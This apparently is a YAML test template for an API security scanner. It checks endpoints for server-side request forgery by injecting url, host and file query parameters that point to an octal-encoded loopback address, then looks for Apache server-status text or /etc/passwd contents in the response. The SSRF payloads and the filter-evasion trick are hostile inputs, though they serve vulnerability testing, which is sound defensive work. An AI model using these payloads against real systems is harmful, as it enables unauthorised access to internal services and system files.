api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal
wordLists:
  paths:
    - "url"
    - "host"
    - "file"
  ssrfURLs:
    - "http://0177.0.0.1/server-status"
    - "http://0177.0.0.1/etc/passwd"
execute:
  type: single
  requests:
    - req:
        - modify_method: GET
        - add_query_param:
            ${paths}: ${ssrfURLs}
        - replace_body: '{}'


validate:
  response_code:
    eq: 200
  or:
    - response_payload:
        length:
          gt: 0
        contains_either:
          - "Apache Server Status"
          - "Server Version"
    - response_payload:
        length:
          gt: 0
        regex: "root:.*:0:0:"
